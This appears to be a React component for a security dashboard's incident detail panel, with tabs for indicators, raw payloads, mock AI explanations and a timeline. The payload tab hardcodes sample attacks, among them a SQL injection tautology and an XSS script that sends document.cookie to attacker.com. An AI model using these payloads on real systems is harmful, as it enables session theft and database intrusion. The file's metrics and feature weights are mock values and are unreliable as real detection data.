import { useState } from "react";
import { 
  ShieldAlert, 
  X, 
  Copy, 
  Zap, 
  Terminal, 
  Globe, 
  Search, 
  Lock, 
  UserX, 
  Cpu, 
  Eye, 
  FileText,
  Activity,
  ArrowDownCircle,
  Clock,
  CheckCircle,
  FileDown
} from "lucide-react";
import { Alert, Severity, AlertStatus } from "../../types";
import { cn } from "../../lib/utils";
import { useAttackTheme } from "../../hooks/useAttackTheme";

interface IncidentDetailProps {
  alert: Alert | null;
  onClose?: () => void;
}

export function IncidentDetail({ alert, onClose }: IncidentDetailProps) {
  const [activeTab, setActiveTab] = useState<"overview" | "payload" | "ai" | "timeline">("overview");
  const [copied, setCopied] = useState(false);
  const [actionMessage, setActionMessage] = useState<string | null>(null);

  if (!alert) return null;

  const theme = useAttackTheme(alert.attackType, true);
  const AttackIcon = getAttackIcon(alert.attackType);

  const handleCopyPayload = () => {
    let payloadStr = alert.rawPayload || alert.rawPayload || "";
    navigator.clipboard.writeText(payloadStr);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const vectorId = alert.id ? (alert.id.charCodeAt(0) * 11 + (alert.id.charCodeAt(1) || 54)).toString() : "2355";
  const showActionMessage = (message: string) => {
    setActionMessage(message);
    window.setTimeout(() => setActionMessage(null), 3500);
  };

  // Mock contributing features for AI Explainability
  const contributingFeatures = [
    { name: "has_script_tag", weight: alert.attackType === "XSS" ? 94 : 12 },
    { name: "encoded_char_ratio", weight: alert.attackType === "SQL Injection" ? 88 : alert.attackType === "XSS" ? 76 : 35 },
    { name: "entropy", weight: alert.attackType === "DDoS" ? 45 : 79 },
    { name: "suspicious_payload_pattern", weight: alert.attackType === "Brute Force" ? 82 : 91 },
  ].sort((a, b) => b.weight - a.weight);

  return (
    <div className="h-full bg-card border border-border rounded-xl flex flex-col relative overflow-hidden select-none transition-all duration-300 shadow-sm"
         style={{ 
           borderTopColor: theme.primary,
           borderTopWidth: '3px'
         }}>
      
      {/* 5.1 INCIDENT HEADER */}
      <div className="p-4 pb-2 border-b border-border/50 bg-secondary/20">
        <div className="flex items-center justify-between gap-2 mb-1.5">
          <h2 className="text-[10px] font-black uppercase tracking-widest flex items-center gap-1.5"
              style={{ color: theme.primary }}>
            <AttackIcon className="w-3.5 h-3.5" />
            {alert.severity.toUpperCase()} {alert.attackType.toUpperCase()} DETECTED
          </h2>
          {onClose && (
            <button 
              onClick={onClose}
              className="w-5 h-5 rounded hover:bg-muted border border-border/40 flex items-center justify-center transition-colors text-muted-foreground hover:text-foreground cursor-pointer"
              title="CLOSE PANEL"
            >
              <X className="w-3 h-3" />
            </button>
          )}
        </div>

        <div className="flex items-center justify-between text-[9px]">
          <div className="flex flex-col">
            <span className="text-[7px] font-black text-muted-foreground uppercase tracking-widest leading-none mb-0.5">INCIDENT ID</span>
            <span className="font-mono font-bold text-foreground">INC-{alert.id}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <span className={cn(
               "text-[7px] font-black px-1.5 py-0.5 rounded uppercase tracking-wider leading-none border",
               alert.severity === Severity.CRITICAL 
                 ? "bg-red-500/15 text-red-500 border-red-500/20" 
                 : alert.severity === Severity.HIGH 
                   ? "bg-orange-500/15 text-orange-500 border-orange-500/20" 
                   : "bg-cyan-500/15 text-cyan-500 border-cyan-500/20"
            )}>
              {alert.severity}
            </span>
            <span className="text-[8px] font-black text-muted-foreground scale-95 origin-right">
              STATUS: <span className="text-yellow-500">{alert.status.toUpperCase()}</span>
            </span>
          </div>
        </div>
      </div>

      {/* NAVIGATION TABS */}
      <div className="flex border-b border-border bg-secondary/5 text-[8.5px] font-black uppercase tracking-wider select-none shrink-0">
        <button 
          onClick={() => setActiveTab("overview")} 
          className={cn(
            "flex-1 py-2.5 text-center transition-colors border-b-2 cursor-pointer",
            activeTab === "overview" 
              ? "border-cyan-500 text-cyan-500 font-bold bg-background/50" 
              : "border-transparent text-muted-foreground hover:text-foreground"
          )}
        >
          Overview
        </button>
        <button 
          onClick={() => setActiveTab("payload")} 
          className={cn(
            "flex-1 py-2.5 text-center transition-colors border-b-2 cursor-pointer",
            activeTab === "payload" 
              ? "border-cyan-500 text-cyan-500 font-bold bg-background/50" 
              : "border-transparent text-muted-foreground hover:text-foreground"
          )}
        >
          Payload
        </button>
        <button 
          onClick={() => setActiveTab("ai")} 
          className={cn(
            "flex-1 py-2.5 text-center transition-colors border-b-2 cursor-pointer",
            activeTab === "ai" 
              ? "border-cyan-500 text-cyan-500 font-bold bg-background/50" 
              : "border-transparent text-muted-foreground hover:text-foreground"
          )}
        >
          AI Analysis
        </button>
        <button 
          onClick={() => setActiveTab("timeline")} 
          className={cn(
            "flex-1 py-2.5 text-center transition-colors border-b-2 cursor-pointer",
            activeTab === "timeline" 
              ? "border-cyan-500 text-cyan-500 font-bold bg-background/50" 
              : "border-transparent text-muted-foreground hover:text-foreground"
          )}
        >
          Timeline
        </button>
      </div>

      {/* MAIN CONTENT AREA */}
      <div className="flex-1 overflow-y-auto custom-scrollbar p-4 space-y-4 min-h-0 bg-card/40">
        
        {activeTab === "overview" && (
          <div className="space-y-4">
            
            {/* 5.2 THREAT VECTOR SECTION */}
            <div className="flex items-center justify-between p-3 rounded-lg border border-border/80 bg-muted/20 relative overflow-hidden">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-lg bg-background border border-border/50 text-muted-foreground" style={{ color: theme.primary }}>
                  <AttackIcon className="w-5 h-5" />
                </div>
                <div className="flex flex-col">
                  <span className="text-[9px] font-black text-muted-foreground uppercase tracking-wider leading-none">THREAT VECTOR</span>
                  <span className="text-xs font-black text-foreground uppercase tracking-tight mt-1">{alert.attackType}</span>
                </div>
              </div>
              <div className="text-right">
                <span className="text-[7px] font-black text-muted-foreground uppercase block leading-none opacity-55">VECTOR ID</span>
                <span className="text-[10px] font-mono font-black text-foreground">VEC-{vectorId}</span>
              </div>
            </div>

            {/* 5.5 IOC DATA POINTS */}
            <div className="space-y-2">
              <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">IOC DATA POINTS</h4>
              <div className="grid grid-cols-2 gap-2 bg-muted/10 p-3 rounded-lg border border-border/40">
                <div className="flex flex-col gap-0.5">
                  <span className="text-[7px] font-black text-muted-foreground uppercase opacity-50">Source IP</span>
                  <span className="text-[10px] font-mono font-bold text-cyan-500">{alert.sourceIp}</span>
                </div>
                <div className="flex flex-col gap-0.5 text-right">
                  <span className="text-[7px] font-black text-muted-foreground uppercase opacity-50">Source Port</span>
                  <span className="text-[10px] font-mono font-bold text-foreground">{alert.sourcePort || Math.floor(Math.random() * 16383) + 49152}</span>
                </div>
                <div className="flex flex-col gap-0.5 mt-1 border-t border-border/50 pt-1.5 col-span-2"></div>
                <div className="flex flex-col gap-0.5">
                  <span className="text-[7px] font-black text-muted-foreground uppercase opacity-50">Destination IP</span>
                  <span className="text-[10px] font-mono font-bold text-foreground">{alert.destinationIp || "10.0.12.15"}</span>
                </div>
                <div className="flex flex-col gap-0.5 text-right">
                  <span className="text-[7px] font-black text-muted-foreground uppercase opacity-50">Target Port</span>
                  <span className="text-[10px] font-mono font-bold text-cyan-500">{alert.destinationPort || alert.destinationPort}</span>
                </div>
                <div className="flex flex-col gap-0.5 mt-1 border-t border-border/50 pt-1.5 col-span-2"></div>
                <div className="flex flex-col gap-0.5">
                  <span className="text-[7px] font-black text-muted-foreground uppercase opacity-50">Protocol</span>
                  <span className="text-[10px] font-bold text-foreground font-mono">{alert.protocol}</span>
                </div>
                <div className="flex flex-col gap-0.5 text-right">
                  <span className="text-[7px] font-black text-muted-foreground uppercase opacity-50">Service</span>
                  <span className="text-[10px] font-bold text-foreground uppercase">{alert.zeekData?.service || alert.attackType.includes("HTTP") || alert.attackType === "XSS" || alert.attackType === "SQL Injection" ? "HTTP" : alert.protocol}</span>
                </div>
              </div>
            </div>

            {/* 5.6 DETECTION ENGINE METRICS */}
            <div className="space-y-1.5">
              <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">DETECTION ENGINE METRICS</h4>
              <div className="grid grid-cols-2 gap-2">
                <div className="bg-muted/10 border border-border/30 p-2 rounded-lg flex flex-col justify-between">
                  <span className="text-[7px] font-black text-muted-foreground uppercase">Precision</span>
                  <span className="text-sm font-black text-foreground font-mono mt-1">98.2%</span>
                </div>
                <div className="bg-muted/10 border border-border/30 p-2 rounded-lg flex flex-col justify-between">
                  <span className="text-[7px] font-black text-muted-foreground uppercase">Anomaly Conf</span>
                  <span className="text-sm font-black text-red-400 font-mono mt-1">{(alert.confidenceScore * 100).toFixed(0)}%</span>
                </div>
                <div className="bg-muted/10 border border-border/30 p-2 rounded-lg flex flex-col justify-between">
                  <span className="text-[7px] font-black text-muted-foreground uppercase">Threat Level</span>
                  <span className={cn(
                    "text-[10px] font-black mt-1",
                    alert.severity === Severity.CRITICAL || alert.severity === Severity.HIGH ? "text-red-500" : "text-cyan-500"
                  )}>{alert.severity.toUpperCase()}</span>
                </div>
                <div className="bg-muted/10 border border-border/30 p-2 rounded-lg flex flex-col justify-between">
                  <span className="text-[7px] font-black text-muted-foreground uppercase">Fusion Score</span>
                  <span className="text-sm font-black text-amber-500 font-mono mt-1">{(alert.riskScore || 85).toFixed(0)}/100</span>
                </div>
              </div>
            </div>

            {/* 5.7 FUSION DECISION FLOW */}
            <div className="space-y-2 border-t border-border/30 pt-3">
              <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">FUSION DECISION FLOW</h4>
              <div className="bg-muted/15 p-3 rounded-lg border border-border/40 space-y-3">
                <div className="flex items-center justify-between text-[8px] font-black text-muted-foreground uppercase pb-1.5 border-b border-border/20">
                  <span>PIPELINE ENGINE</span>
                  <span>RESULT VALUE</span>
                </div>
                
                {/* Steppers */}
                <StepRow label="Zeek log analyzer" output="Logged Connection Event" count="100%" />
                <StepRow label="AI2B Network Classifier" output={`${alert.attackType} Sub-Model (${(alert.confidenceScore * 100).toFixed(0)}% Match)`} count="95%" isMalicious />
                <StepRow label="Suricata Signature Match" output="Active alert triggered" count="Alert" isMalicious />
                <StepRow 
                  label="Fusion Layer Correlation" 
                  output={`${alert.severity.toUpperCase()} risk score set: ${(alert.riskScore || 85).toFixed(0)}`} 
                  count="RESOLVED" 
                  isMalicious 
                  isFinal 
                />
              </div>
            </div>

          </div>
        )}

        {/* 5.3 RAW PAYLOAD BUFFER */}
        {activeTab === "payload" && (
          <div className="space-y-4 h-full flex flex-col min-h-0">
            <div className="flex justify-between items-center whitespace-nowrap">
              <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">RAW HTTP PACKET BUFFER</h4>
              <button 
                onClick={handleCopyPayload}
                className="flex items-center gap-1.5 bg-background border border-border px-2 py-1 rounded hover:bg-muted font-black text-[7.5px] uppercase tracking-wider text-muted-foreground hover:text-foreground cursor-pointer transition-colors"
              >
                <Copy className="w-2.5 h-2.5" />
                {copied ? "COPIED" : "COPY BUFFER"}
              </button>
            </div>
            
            <div className="bg-zinc-950 text-slate-300 font-mono text-[9.5px] leading-relaxed p-4 rounded-lg border border-border relative overflow-y-auto max-h-55 custom-scrollbar flex-1 select-text">
              <div className="space-y-1">
                <p className="text-sky-500">POST /v1/gateway/query?action=debug HTTP/1.1</p>
                <p><span className="text-zinc-600">Host:</span> {alert.destinationIp || "10.0.12.15"}</p>
                <p><span className="text-zinc-600">Connection:</span> keep-alive</p>
                <p><span className="text-zinc-600">User-Agent:</span> Mozilla/5.0 (SecurityScan/3.1; CoreEngine)</p>
                <p><span className="text-zinc-600">Authorization:</span> Bearer 0x8a923f110cbe</p>
                <p><span className="text-zinc-600">Content-Type:</span> application/json</p>
                <p>&nbsp;</p>
                
                {/* Syntax highlighted threat parameters */}
                <div className="p-2.5 rounded bg-zinc-900 border border-zinc-800 text-amber-500 wrap-break-words font-semibold">
                  {alert.attackType === "SQL Injection" ? (
                    <>
                      <span className="text-red-400">SELECT</span> * <span className="text-red-400">FROM</span> users <span className="text-red-400">WHERE</span> user_id = <span className="text-emerald-400">'admin' OR '1'='1' --</span><br />
                      <span className="text-zinc-500">// Payload entropy high, comments detected</span>
                    </>
                  ) : alert.attackType === "XSS" ? (
                    <>
                      &lt;<span className="text-red-400">script</span>&gt;<span className="text-emerald-400">fetch</span>('http://attacker.com/leak?cookie='+<span className="text-emerald-400">document.cookie</span>)&lt;/<span className="text-red-400">script</span>&gt;<br />
                      <span className="text-zinc-500">// Embedded markup/HTML script tags detected in request body</span>
                    </>
                  ) : alert.attackType === "Brute Force" ? (
                    <>
                      auth_attempt: &quot;<span className="text-emerald-400">admin</span>&quot;, pass_hash: &quot;<span className="text-red-400">0x2519A</span>&quot;, iterations_num: 15024<br />
                      <span className="text-zinc-500">// Sequential trial logs match pattern of active brute force dictionary attack</span>
                    </>
                  ) : (
                    <>
                      <span className="text-red-400">EXPLOIT</span> payload detected: <span className="text-emerald-400">0x414141417f454c4602010100000c25a07c11f440</span><br />
                      <span className="text-zinc-500">// Abnormal payload content ratio exceeds normal statistical boundaries</span>
                    </>
                  )}
                </div>
              </div>
            </div>

            {/* 5.4 ANALYST INTERPRETATION */}
            <div className="bg-muted/10 border-l-2 p-3 rounded-r-lg space-y-1.5" style={{ borderLeftColor: theme.primary }}>
              <span className="text-[7.5px] font-black text-muted-foreground uppercase tracking-widest leading-none block">SECURITY ANALYST INTERPRETATION</span>
              <p className="text-[10px] text-muted-foreground/90 italic leading-relaxed">
                "Deep packet inspection confirms an active {alert.attackType} attempt originating from suspicious IP source {alert.sourceIp}. The target system port is {alert.destinationPort || alert.destinationPort}. Core AI correlation engine has assigned a confidence metric of {(alert.confidenceScore * 100).toFixed(0)}%."
              </p>
            </div>
          </div>
        )}

        {/* 5.4 AI SECURITY ANALYSIS */}
        {activeTab === "ai" && (
          <div className="space-y-4">
            
            <div className="bg-muted/10 rounded-lg p-3 border border-border/40 space-y-2">
              <div className="flex items-center gap-2 text-cyan-400">
                <Cpu className="w-4 h-4" />
                <span className="text-[10px] font-black uppercase tracking-wider">AI RECOMMENDATIONS & EXPLANATION</span>
              </div>
              <p className="text-[10.5px] leading-relaxed text-muted-foreground">
                The multi-modal model correlation layer isolated anomalous payload content matching signature footprints of high-level threat agents. Key risk variables triggered positive indicators across all pipeline stages.
              </p>
            </div>

            {/* Contributing features progress list */}
            <div className="space-y-2.5">
              <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">TOP CONTRIBUTING FEATURES (CONTRIBUTION SHAP WEIGHTS)</h4>
              <div className="space-y-2.5 bg-muted/5 p-3 rounded-lg border border-border/30">
                {contributingFeatures.map((feat) => (
                  <div key={feat.name} className="space-y-1">
                    <div className="flex justify-between items-center text-[9px]">
                      <span className="font-mono font-bold text-foreground">{feat.name}</span>
                      <span className="font-mono font-bold text-cyan-400">+{feat.weight}% weight</span>
                    </div>
                    <div className="h-1 bg-muted rounded-full overflow-hidden">
                      <div className="h-full bg-cyan-500 rounded-full" style={{ width: `${feat.weight}%` }} />
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Anomaly Indicators List */}
            <div className="space-y-1.5">
              <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">ANOMALY INDICATORS</h4>
              <ul className="text-xs space-y-1 px-1 text-muted-foreground">
                <li className="flex items-center gap-2"><div className="w-1 h-1 rounded-full bg-red-400" /> High Shannon payload character entropy</li>
                <li className="flex items-center gap-2"><div className="w-1 h-1 rounded-full bg-red-400" /> Embedded structural markup or binary payloads</li>
                <li className="flex items-center gap-2"><div className="w-1 h-1 rounded-full bg-red-400" /> Source IP matches active block list caches</li>
              </ul>
            </div>

          </div>
        )}

        {/* TIMELINE */}
        {activeTab === "timeline" && (
          <div className="space-y-4">
            <h4 className="text-[8px] font-black text-muted-foreground uppercase tracking-widest">INCIDENT INVESTIGATION TIMELINE</h4>
            
            <div className="relative border-l border-border/80 pl-3.5 ml-2.5 space-y-4 py-1">
              {alert.timeline && alert.timeline.length > 0 ? (
                alert.timeline.map((item, idx) => (
                  <div key={item.id} className="relative">
                    {/* Circle Node indicator */}
                    <div className="absolute left-[-19.5px] top-0.5 bg-muted border border-border w-3 h-3 rounded-full flex items-center justify-center">
                      <div className="w-1.5 h-1.5 rounded-full bg-cyan-500" />
                    </div>
                    <div className="flex flex-col gap-0.5">
                      <div className="flex items-center justify-between">
                        <span className="text-[9.5px] font-black text-foreground uppercase tracking-tight">{item.type}</span>
                        <span className="text-[8px] font-mono font-bold text-muted-foreground">{new Date(item.timestamp).toLocaleTimeString([], { hour12: false })}</span>
                      </div>
                      <p className="text-[9.5px] text-muted-foreground/95">{item.description}</p>
                    </div>
                  </div>
                ))
              ) : (
                <>
                  <div className="relative">
                    <div className="absolute left-[-19.5px] top-0.5 bg-muted border border-border w-3 h-3 rounded-full flex items-center justify-center">
                      <div className="w-1.5 h-1.5 bg-cyan-500 rounded-full" />
                    </div>
                    <div className="flex flex-col">
                      <div className="flex justify-between items-center">
                        <span className="text-[9.5px] font-black text-foreground">INITIAL DETECTION</span>
                        <span className="text-[8px] font-mono font-bold text-muted-foreground">02:27:10</span>
                      </div>
                      <p className="text-[9.5px] text-muted-foreground">System captured anomalous {alert.attackType} payload activity.</p>
                    </div>
                  </div>
                  <div className="relative">
                    <div className="absolute left-[-19.5px] top-0.5 bg-muted border border-border w-3 h-3 rounded-full flex items-center justify-center">
                      <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse" />
                    </div>
                    <div className="flex flex-col">
                      <div className="flex justify-between items-center">
                        <span className="text-[9.5px] font-black text-red-500">CORRELATION COMPLETED</span>
                        <span className="text-[8px] font-mono font-bold text-muted-foreground">02:27:15</span>
                      </div>
                      <p className="text-[9.5px] text-muted-foreground">Multi-modal AI Engine confirmed malicious activity threat pattern.</p>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

      </div>

      {/* 5.8 ACTION BUTTONS */}
      <div className="p-3 bg-secondary/15 border-t border-border shrink-0 space-y-2">
        {actionMessage && (
          <div className="rounded border border-cyan-500/20 bg-cyan-500/10 text-cyan-500 px-2 py-1.5 text-[8px] font-black uppercase tracking-widest">
            {actionMessage}
          </div>
        )}
        {/* Core SOC investigations */}
        <div className="flex gap-2">
          <button 
            onClick={() => {
              showActionMessage("Incident confirmation status changed: CONFIRMED");
            }}
            className="flex-1 py-1.5 px-2 bg-rose-600 border border-rose-500 text-[8.5px] font-black uppercase tracking-wider text-white hover:bg-rose-700 transition-colors rounded cursor-pointer leading-none flex items-center justify-center gap-1"
          >
            <CheckCircle className="w-3 h-3" />
            CONFIRM INCIDENT
          </button>
          <button 
            onClick={() => {
              showActionMessage(`Evidence export queued for INC-${alert.id}`);
            }}
            className="flex-1 py-1.5 px-2 bg-background border border-border text-[8.5px] font-black uppercase tracking-wider text-foreground hover:bg-muted transition-colors rounded cursor-pointer leading-none flex items-center justify-center gap-1"
          >
            <FileDown className="w-3 h-3" />
            EXPORT EVIDENCE
          </button>
        </div>
        
        {/* Mitigate action lines */}
        <div className="flex gap-2 pt-1 border-t border-border/10">
          <button 
            onClick={() => {
              showActionMessage(`Host isolation requested for ${alert.sourceIp}`);
            }}
            className="flex-1 py-1 px-1 border border-border text-[7.5px] font-black uppercase tracking-wider text-muted-foreground hover:text-red-500 hover:border-red-500/30 hover:bg-red-500/5 transition-all rounded cursor-pointer"
          >
            ISOLATE HOST
          </button>
          <button 
            onClick={() => {
              showActionMessage(`Firewall block requested for ${alert.sourceIp}`);
            }}
            className="flex-1 py-1 px-1 border border-border text-[7.5px] font-black uppercase tracking-wider text-muted-foreground hover:text-amber-500 hover:border-amber-500/30 hover:bg-amber-500/5 transition-all rounded cursor-pointer"
          >
            BLOCK IP
          </button>
          {onClose && (
            <button 
              onClick={onClose}
              className="flex-1 py-1 px-1 bg-muted border border-border text-[7.5px] font-black uppercase tracking-wider text-foreground hover:bg-muted/80 transition-all rounded cursor-pointer"
            >
              CLOSE
            </button>
          )}
        </div>
      </div>

    </div>
  );
}

function StepRow({ label, output, count, isMalicious, isFinal }: { label: string, output: string, count: string, isMalicious?: boolean, isFinal?: boolean }) {
  return (
    <div className="flex items-start gap-2.5 relative">
      {!isFinal && (
        <div className="absolute left-[3.5px] top-3.5 bottom-0 w-0.5 bg-border/50" />
      )}
      <div className={cn(
        "w-2 h-2 rounded-full mt-1.5 shrink-0 border border-background",
        isMalicious ? "bg-red-500 shadow-[0_0_5px_#ef4444]" : "bg-cyan-500"
      )} />
      <div className="flex-1 flex justify-between text-[9px] min-w-0 pr-1">
        <div className="flex flex-col truncate max-w-[80%]">
          <span className="font-bold text-foreground leading-none">{label}</span>
          <span className="text-[7.5px] text-muted-foreground truncate leading-relaxed mt-0.5">{output}</span>
        </div>
        <span className={cn(
          "font-mono font-bold text-[8px]",
          isMalicious ? "text-red-400" : "text-muted-foreground"
        )}>{count}</span>
      </div>
    </div>
  );
}

function getAttackIcon(name: string) {
  switch (name) {
    case "DDoS": return Zap;
    case "SQL Injection": return Terminal;
    case "XSS": return Globe;
    case "Port Scan": return Search;
    case "Brute Force": return Lock;
    case "Unauthorized Access": return UserX;
    case "Malware": return Cpu;
    case "Phishing": return Eye;
    case "Ransomware": return ShieldAlert;
    case "Insider Threat": return UserX;
    default: return ShieldAlert;
  }
}
